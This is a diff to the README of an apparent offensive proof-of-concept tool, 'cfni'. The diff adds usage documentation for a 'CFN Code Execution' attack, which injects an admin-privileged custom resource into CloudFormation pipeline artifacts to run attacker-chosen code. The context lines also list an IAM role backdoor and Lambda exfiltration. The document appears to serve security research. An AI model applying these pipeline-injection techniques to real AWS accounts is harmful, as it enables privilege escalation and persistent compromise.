@@ -21,9 +21,51 @@ The relevant bucket can be found in the build project (Synth) under artifacts up
 
 ## Attacks
 The proof-of-concept currently supports the following attacks:
+- [CFN Code Execution](#cfn-code-execution)
 - [IAM Role Backdoor](#iam-role-backdoor)
 - [Lamda Exfiltration](#lambda-exfiltration)
 - [Lamda Set Envs](#lambda-set-envs)
+
+### CFN Code Execution
+Adds a custom resource with admin permission to run custom code
+
+```
+Usage:
+  cfni cfn-code-execution [flags]
+
+Examples:
+cat > input.js << EOF
+async function cfni(event, context) {
+	console.log(event)
+	return {}
+}
+EOF
+
+cfni cfn-code-execution --attacker-profile ap --bucket-profile bp --bucket pipeline-bucket --s3-access-key-id AKIAXXX --s3-secret-access-key Ey123XXX -f input.js --runtime nodejs16.x
+
+Flags:
+  -b, --bucket string                 bucket name (required)
+      --custom-type string            custom type of custom resource (default "CFNICustomResource")
+      --environment strings           filter environments (default all environments)
+  -f, --filename string               filename of the code execution file
+  -h, --help                          help for cfn-code-execution
+      --locigal-custom-id string      logical id of custom resource (default "CFNICustomResourceCE34F12B")
+      --locigal-lambda-id string      logical id of lambda (default "CFNILambdaFB14A34E")
+      --locigal-role-id string        logical id of role (default "CFNIRoleAF22D32D")
+      --runtime string                runtime of the code execution
+      --s3-access-key-id string       s3 access key id
+      --s3-secret-access-key string   s3 secret access key
+      --s3-session-token string       s3 session token
+      --stack strings                 filter stacks (default all stacks)
+      --stage strings                 filter stages (default all stages)
+
+Global Flags:
+      --attacker-profile string   attacker AWS profile
+      --attacker-region string    attacker AWS region
+      --bucket-profile string     bucket AWS profile
+  -A, --user-agent string         user-agent to use for sdk calls (default "cfni")
+```
+
 
 ### IAM Role Backdoor
 Adds a role with admin permissions.
